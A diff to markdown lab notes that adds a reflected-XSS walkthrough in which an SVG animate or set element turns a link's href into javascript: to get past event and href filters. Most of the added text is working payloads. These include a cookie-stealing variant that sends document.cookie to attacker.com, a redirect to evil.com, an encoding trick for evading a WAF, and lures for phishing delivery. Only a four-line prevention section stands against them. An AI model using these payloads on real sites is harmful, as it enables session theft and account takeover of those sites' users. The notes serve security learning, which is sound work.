@@ -4967,7 +4967,7 @@ Execute
 
 ---
 
-# Lab - 12 📝 Reflected XSS with SVG Allowed 
+# Lab - 13 📝 Reflected XSS with SVG Allowed 
 
 ---
 
@@ -5473,3 +5473,319 @@ onbegin allowed
 👉 SVG + CSP bypass  
 👉 XSS polyglots  
 👉 Advanced WAF evasion
+
+---
+
+# Lab - 14 📝 Reflected XSS with Whitelisted Tags & Blocked href/events (SVG Animate Bypass)
+
+---
+
+## 🧭 Overview
+
+✔ Some tags allowed (SVG, a, etc.)  
+❌ All events blocked (onclick, onerror, etc.)  
+❌ Direct href="javascript:..." blocked  
+
+👉 **Goal:**
+
+```
+alert(1)
+```
+
+---
+
+## 🧠 Core Concept
+
+Direct attack → blocked ❌  
+Dynamic modification → allowed ✔  
+
+👉 We don’t write dangerous code directly  
+👉 We make browser create it later 😈  
+
+---
+
+## 🔄 Flow
+
+User Input → Server → Response → Browser → SVG animate → modify href → Click → JS executes  
+
+---
+
+## 🧠 Source
+
+```
+?search=
+```
+
+---
+
+## 🧠 Sink
+
+Reflected into HTML page  
+
+---
+
+## ⚠️ Restrictions
+
+```
+onclick / onerror        → blocked
+href="javascript:..."   → blocked
+SVG tags                → allowed
+animate tag             → allowed
+```
+
+---
+
+## 🪜 Lab Steps
+
+---
+
+### Step 1 — Test reflection
+
+```
+test123
+```
+
+✔ Appears on page  
+
+---
+
+### Step 2 — Try normal payload
+
+```
+<img src=1 onerror=alert(1)>
+```
+
+❌ Blocked  
+
+---
+
+### Step 3 — Try anchor
+
+```
+<a href="javascript:alert(1)">Click</a>
+```
+
+❌ Blocked  
+
+---
+
+### Step 4 — Find alternative (SVG)
+
+SVG supports animation → can modify attributes  
+
+---
+
+### Step 5 — Build payload
+
+```
+<svg>
+  <a>
+    <animate attributeName=href values=javascript:alert(1) />
+    <text>Click me</text>
+  </a>
+</svg>
+```
+
+---
+
+### Step 6 — Encode for URL
+
+```
+<  → %3C
+>  → %3E
+(space) → %20
+```
+
+---
+
+## 💥 FINAL PAYLOAD
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click me</text></a></svg>
+```
+
+![final payload execution](../images/svg-animate-xss-final.png)
+
+---
+
+## 🧠 Payload Breakdown
+
+```
+<svg>                     → allowed container
+<a>                       → clickable element
+<animate>                 → dynamic modifier
+attributeName=href        → target attribute
+values=javascript:alert(1) → payload
+<text>Click me</text>     → user trigger
+```
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Payload injected  
+2️⃣ WAF checks → no direct attack → allows ✔  
+3️⃣ Browser loads SVG  
+4️⃣ animate runs automatically  
+5️⃣ href becomes javascript:alert(1)  
+6️⃣ User clicks  
+7️⃣ alert(1) executes 💥  
+
+---
+
+## 🧠 Key Learning
+
+Filters check static input ❌  
+Browser executes dynamic behavior ✔  
+
+---
+
+## 🌍 Real-World Variations
+
+---
+
+### 🟢 1️⃣ Basic SVG animation
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(document.domain) /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 2️⃣ Different JS payload
+
+```
+<svg><a><animate attributeName=href values=javascript:confirm(1) /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 3️⃣ Cookie stealing (real attack)
+
+```
+<svg><a><animate attributeName=href values=javascript:fetch('https://attacker.com/?c='+document.cookie) /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 4️⃣ Redirect attack
+
+```
+<svg><a><animate attributeName=href values=javascript:location='https://evil.com' /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 5️⃣ Encoding bypass
+
+```
+<svg><a><animate attributeName=href values=javascript:%61lert(1) /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 6️⃣ Using <set> instead of animate
+
+```
+<svg><a><set attributeName=href to=javascript:alert(1) /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 7️⃣ Delayed execution
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(1) begin=1s /><text>Click</text></a></svg>
+```
+
+---
+
+### 🟢 8️⃣ Multiple values trick
+
+```
+<svg><a><animate attributeName=href values="safe;javascript:alert(1)" /><text>Click</text></a></svg>
+```
+
+---
+
+## 🧠 Advanced Real-World Scenarios
+
+---
+
+### 🔴 Scenario 1 — WAF blocks "javascript:"
+
+```
+javascript:%61lert(1)
+```
+
+---
+
+### 🔴 Scenario 2 — href blocked but SVG allowed
+
+👉 Use:
+
+```
+animate / set / animateTransform
+```
+
+---
+
+### 🔴 Scenario 3 — user interaction required
+
+👉 Use social engineering:
+
+```
+"Click here"
+"Verify account"
+"Download file"
+```
+
+---
+
+### 🔴 Scenario 4 — phishing delivery
+
+```
+https://target.com/?search=PAYLOAD
+```
+
+---
+
+### 🔴 Scenario 5 — DOM reuse
+
+Payload stored → reused later → executed via JS  
+
+---
+
+## 🧠 Common Mistakes
+
+❌ Using direct href  
+❌ Using blocked events  
+❌ Forgetting encoding  
+❌ Not adding clickable text  
+
+---
+
+## 🛡 Prevention
+
+Escape HTML properly  
+Sanitize or block SVG  
+Avoid dynamic attribute modification  
+Use CSP  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+👉 What is allowed?  
+👉 What is blocked?  
+👉 Can I modify behavior dynamically?  
+
+---
+
+## 🧠 Formula
+
+```
+Find Allowed → Find Dynamic Feature → Modify Attribute → Trigger
+```
